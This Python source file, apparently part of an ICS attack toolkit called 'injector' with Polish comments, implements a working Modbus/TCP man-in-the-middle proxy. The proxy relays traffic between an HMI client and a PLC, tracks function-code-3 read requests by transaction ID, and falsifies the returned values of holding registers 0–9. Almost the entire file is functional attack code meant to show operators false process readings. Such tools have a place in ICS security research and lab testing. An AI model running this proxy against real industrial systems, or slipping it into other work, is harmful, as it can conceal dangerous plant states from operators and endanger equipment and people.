# injector/attacks/modbus_proxy_spoof.py

import socket
import threading
import time
from dataclasses import dataclass, field
from typing import Dict, Optional, Tuple, List

from injector.core.config import PlcConfig
from injector.core.logging_setup import logging

log = logging.getLogger(__name__)

# ----------------------------
# Modbus/TCP helpers (MBAP)
# ----------------------------

def _u16(b: bytes) -> int:
    return int.from_bytes(b, byteorder="big", signed=False)

def _p16(n: int) -> bytes:
    return int(n).to_bytes(2, byteorder="big", signed=False)

def parse_mbap_frame(buf: bytearray) -> Optional[bytes]:
    """
    Z TCP streamu wycina 1 kompletną ramkę Modbus/TCP.
    Zwraca bytes ramki lub None jeśli brak kompletu.

    MBAP:
      TID(2) PID(2) LEN(2) UID(1) + PDU(...)
    LEN = liczba bajtów: UID + PDU
    Długość całej ramki w bajtach na drucie = 6 + LEN
    """
    if len(buf) < 7:
        return None
    length_field = _u16(buf[4:6])
    total_len = 6 + length_field
    if total_len <= 0:
        del buf[0:1]
        return None
    if len(buf) < total_len:
        return None
    frame = bytes(buf[:total_len])
    del buf[:total_len]
    return frame

def mbap_parts(frame: bytes) -> Tuple[int, int, int, int, bytes]:
    """
    Zwraca: tid, pid, length, unit_id, pdu
    """
    tid = _u16(frame[0:2])
    pid = _u16(frame[2:4])
    length = _u16(frame[4:6])
    unit_id = frame[6]
    pdu = frame[7:]
    # length powinien być 1 + len(pdu)
    return tid, pid, length, unit_id, pdu


# ----------------------------
# Spoof rules / state
# ----------------------------

@dataclass
class PendingReq:
    func: int
    start_addr: int
    count: int
    ts: float = field(default_factory=time.time)

@dataclass
class ConnState:
    """
    Stan per-connection: mapujemy Transaction ID -> request metadata.
    """
    lock: threading.Lock = field(default_factory=threading.Lock)
    pending: Dict[int, PendingReq] = field(default_factory=dict)

    def put(self, tid: int, req: PendingReq) -> None:
        with self.lock:
            self.pending[tid] = req
            now = time.time()
            for k in list(self.pending.keys()):
                if now - self.pending[k].ts > 5.0:
                    self.pending.pop(k, None)

    def pop(self, tid: int) -> Optional[PendingReq]:
        with self.lock:
            return self.pending.pop(tid, None)


def should_spoof_register(cfg: PlcConfig, addr: int) -> bool:
    """
    na razie prosta wersja: spoofujemy HR[0..9] jako przykład.
    """
    # PRZYKŁAD: spoof tylko dla zakresu HMI
    return 0 <= addr <= 9

def spoof_value_for(cfg: PlcConfig, addr: int, real_value: int) -> int:
    """
    Generator wartości spoofowanych.
    Wersja prosta: np. "odwróć" albo dodaj offset.
    """
    # przykład: przesunięcie o +1000 modulo 65536
    return (real_value + 1000) & 0xFFFF


# ----------------------------
# Core spoofing logic
# ----------------------------

def maybe_record_request(state: ConnState, frame: bytes) -> None:
    """
    Interesuje nas FC3 request:
      PDU: func(1)=3, start(2), count(2)
    """
    tid, pid, length, unit_id, pdu = mbap_parts(frame)
    if not pdu:
        return
    func = pdu[0]
    if func != 3:
        return
    if len(pdu) < 5:
        return
    start = _u16(pdu[1:3])
    count = _u16(pdu[3:5])
    state.put(tid, PendingReq(func=func, start_addr=start, count=count))

def maybe_spoof_response(cfg: PlcConfig, state: ConnState, frame: bytes) -> bytes:
    """
    Spoofujemy FC3 response:
      PDU: func(1)=3, byte_count(1), data(2*count)
    count znamy z requestu (mapa tid->PendingReq).
    """
    tid, pid, length, unit_id, pdu = mbap_parts(frame)
    if not pdu:
        return frame

    func = pdu[0]
    # Exception response: func | 0x80, code(1)
    if func & 0x80:
        return frame

    if func != 3:
        return frame

    req = state.pop(tid)
    if req is None:
        # nie znaleźliśmy kontekstu (np. zgubione pakiety) -> nie psuj
        return frame

    if len(pdu) < 2:
        return frame

    byte_count = pdu[1]
    data = bytearray(pdu[2:])

    # spodziewane 2*req.count, ale nie ufamy w 100%
    expected = req.count * 2
    if byte_count != len(data) or len(data) < 2:
        return frame

    # modyfikujemy wybrane rejestry w odpowiedzi
    for i in range(0, min(len(data), expected), 2):
        reg_index = i // 2
        addr = req.start_addr + reg_index
        if should_spoof_register(cfg, addr):
            real_val = _u16(data[i:i+2])
            fake_val = spoof_value_for(cfg, addr, real_val)
            data[i:i+2] = _p16(fake_val)

    # składamy PDU z powrotem
    new_pdu = bytes([3, byte_count]) + bytes(data)

    # długość MBAP musi być spójna: LEN = 1 + len(PDU)
    new_length = 1 + len(new_pdu)
    new_frame = bytearray()
    new_frame += _p16(tid)
    new_frame += _p16(pid)
    new_frame += _p16(new_length)
    new_frame += bytes([unit_id])
    new_frame += new_pdu
    return bytes(new_frame)


# ----------------------------
# TCP forwarding with framing
# ----------------------------

def forward_stream(
    *,
    src: socket.socket,
    dst: socket.socket,
    stop_event: threading.Event,
    direction: str,
    cfg: PlcConfig,
    state: ConnState,
    record_requests: bool,
    spoof_responses: bool,
) -> None:
    """
    direction tylko do logów.
    record_requests=True w kierunku klient->PLC
    spoof_responses=True w kierunku PLC->klient
    """
    buf = bytearray()

    while not stop_event.is_set():
        try:
            chunk = src.recv(4096)
            if not chunk:
                break
            buf.extend(chunk)
        except socket.timeout:
            continue
        except OSError:
            break

        while True:
            frame = parse_mbap_frame(buf)
            if frame is None:
                break

            if record_requests:
                try:
                    maybe_record_request(state, frame)
                except Exception as e:
                    log.debug("[%s] record request error: %r", direction, e)

            if spoof_responses:
                try:
                    frame = maybe_spoof_response(cfg, state, frame)
                except Exception as e:
                    log.debug("[%s] spoof response error: %r", direction, e)

            try:
                dst.sendall(frame)
            except OSError:
                return


def handle_connection(
    client_sock: socket.socket,
    plc_addr: Tuple[str, int],
    stop_event: threading.Event,
    cfg: PlcConfig,
):
    plc_sock: Optional[socket.socket] = None
    state = ConnState()

    try:
        plc_sock = socket.create_connection(plc_addr, timeout=3.0)
        client_sock.settimeout(1.0)
        plc_sock.settimeout(1.0)

        t1 = threading.Thread(
            target=forward_stream,
            kwargs=dict(
                src=client_sock,
                dst=plc_sock,
                stop_event=stop_event,
                direction="C->P",
                cfg=cfg,
                state=state,
                record_requests=True,
                spoof_responses=False,
            ),
            daemon=True,
        )
        t2 = threading.Thread(
            target=forward_stream,
            kwargs=dict(
                src=plc_sock,
                dst=client_sock,
                stop_event=stop_event,
                direction="P->C",
                cfg=cfg,
                state=state,
                record_requests=False,
                spoof_responses=True,
            ),
            daemon=True,
        )

        t1.start()
        t2.start()
        t1.join()
        t2.join()

    except Exception as e:
        log.debug("Proxy connection handler finished with exception: %r", e)
    finally:
        try:
            client_sock.close()
        except Exception:
            pass
        if plc_sock:
            try:
                plc_sock.close()
            except Exception:
                pass


def run_modbus_proxy(
    cfg: PlcConfig,
    stop_event: threading.Event,
    listen_host: str,
    listen_port: int,
    ready_event: Optional[threading.Event] = None,
):
    plc_addr = (cfg.plc_host, cfg.plc_port)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((listen_host, listen_port))
    srv.listen(50)
    srv.settimeout(1.0)

    log.info(
        "Spoof proxy listening on %s:%s -> PLC %s:%s",
        listen_host, listen_port, cfg.plc_host, cfg.plc_port
    )

    if ready_event:
        ready_event.set()

    try:
        while not stop_event.is_set():
            try:
                client_sock, addr = srv.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            log.info("New client for spoof proxy: %s", addr)
            t = threading.Thread(
                target=handle_connection,
                args=(client_sock, plc_addr, stop_event, cfg),
                daemon=True,
            )
            t.start()
    finally:
        try:
            srv.close()
        except Exception:
            pass
        log.info("Spoof proxy stopped.")
